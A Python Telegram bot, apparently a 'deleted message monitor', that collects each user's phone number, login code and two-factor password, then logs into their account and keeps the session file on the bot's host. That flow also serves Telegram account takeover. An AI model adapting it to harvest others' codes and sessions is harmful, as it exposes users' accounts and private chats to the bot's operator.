import os
import asyncio
import logging
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.tl.custom import Button
import nest_asyncio

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

bot = TelegramClient('bot', API_ID, API_HASH)

# Состояния пользователей
user_sessions = {}  # {user_id: {'phone': '+...', 'client': TelegramClient, 'step': '...'}}
authorized_users = set()
ACCESS_PIN = "5482"

# Кэш для уведомлений
message_cache = {}

@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.message.text.strip()

    # === ПИН-КОД ===
    if user_id not in authorized_users:
        if text == ACCESS_PIN:
            authorized_users.add(user_id)
            await event.reply("✅ **Пин-код верный!** Используй /start")
        else:
            await event.reply("🔐 **Введите пин-код:**\n`5482`")
        return

    # === ОСНОВНОЕ МЕНЮ ===
    if text == "/start":
        buttons = [
            [Button.text("📞 Войти по номеру", resize=True)],
            [Button.text("❓ Помощь")]
        ]
        await event.reply(
            "👋 **Добро пожаловать!**\n\n"
            "Выбери способ входа:",
            buttons=buttons
        )
        return

    # === ПОМОЩЬ ===
    if text == "❓ Помощь":
        await event.reply(
            "📚 **Помощь**\n\n"
            "1️⃣ Введи пин-код 5482\n"
            "2️⃣ Нажми 'Войти по номеру'\n"
            "3️⃣ Введи номер телефона\n"
            "4️⃣ Введи код из Telegram\n"
            "5️⃣ Начнётся мониторинг"
        )
        return

    # === ВЫБОР ВХОДА ПО НОМЕРУ ===
    if text == "📞 Войти по номеру":
        user_sessions[user_id] = {'step': 'waiting_phone'}
        await event.reply("📞 **Введите номер телефона** в формате:\n`+79001234567`")
        return

    # === ОЖИДАНИЕ НОМЕРА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_phone':
        phone = text
        user_sessions[user_id]['phone'] = phone
        user_sessions[user_id]['step'] = 'waiting_code'
        
        # Создаём клиента
        client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
        await client.connect()
        
        try:
            # Отправляем запрос кода
            sent_code = await client.send_code_request(phone)
            user_sessions[user_id]['client'] = client
            user_sessions[user_id]['code_hash'] = sent_code.phone_code_hash
            
            await event.reply(
                "✅ **Код отправлен!**\n\n"
                "📨 Проверь Telegram\n"
                "⏳ У тебя 2 минуты\n"
                "✍️ **Введи 5-значный код:**"
            )
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")
            del user_sessions[user_id]
        return

    # === ОЖИДАНИЕ КОДА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_code':
        code = text.strip()
        session = user_sessions[user_id]
        client = session['client']
        
        try:
            # Пробуем войти с кодом
            await client.sign_in(session['phone'], code, phone_code_hash=session['code_hash'])
            
            # Успешный вход
            me = await client.get_me()
            await event.reply(
                f"✅ **Успешный вход!**\n\n"
                f"👤 Аккаунт: @{me.username}\n"
                f"🆔 ID: {me.id}\n\n"
                f"🔍 **Запускаю мониторинг...**"
            )
            
            # Удаляем временные данные
            del user_sessions[user_id]
            
            # Запускаем мониторинг
            asyncio.create_task(monitor_user_chats(user_id, client))
            
        except SessionPasswordNeededError:
            # Требуется 2FA
            user_sessions[user_id]['step'] = 'waiting_2fa'
            await event.reply("🔐 **Требуется двухфакторный пароль.**\nВведи его:")
            
        except PhoneCodeInvalidError:
            await event.reply("❌ **Неверный код!**\nПопробуй ещё раз:")
            
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")
            del user_sessions[user_id]
        return

    # === ОЖИДАНИЕ 2FA ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_2fa':
        password = text
        session = user_sessions[user_id]
        client = session['client']
        
        try:
            await client.sign_in(password=password)
            
            me = await client.get_me()
            await event.reply(
                f"✅ **Успешный вход с 2FA!**\n\n"
                f"👤 Аккаунт: @{me.username}\n"
                f"🆔 ID: {me.id}\n\n"
                f"🔍 **Запускаю мониторинг...**"
            )
            
            del user_sessions[user_id]
            asyncio.create_task(monitor_user_chats(user_id, client))
            
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")
        return

# === МОНИТОРИНГ ЧАТОВ ===
async def monitor_user_chats(user_id, client):
    """Мониторит удалённые и изменённые сообщения"""
    
    await bot.send_message(user_id, "🔍 **Мониторинг запущен!**")
    
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        """Удалённые сообщения"""
        for msg_id in event.deleted_ids:
            await bot.send_message(
                user_id,
                f"🗑 **Удалено сообщение**\n"
                f"🆔 ID: {msg_id}\n"
                f"📌 Чат: {event.chat_id}"
            )
    
    @client.on(events.MessageEdited)
    async def on_edit(event):
        """Изменённые сообщения"""
        await bot.send_message(
            user_id,
            f"✏️ **Изменено сообщение**\n"
            f"📝 Новый текст: {event.message.text}"
        )
    
    @client.on(events.NewMessage)
    async def on_new(event):
        """Кэшируем новые сообщения"""
        cache_key = f"{event.chat_id}_{event.message.id}"
        message_cache[cache_key] = {
            'text': event.message.text,
            'time': datetime.now().isoformat()
        }
    
    await client.run_until_disconnected()

# === ЗАПУСК ===
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Бот @{me.username} запущен! Пин-код: 5482")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())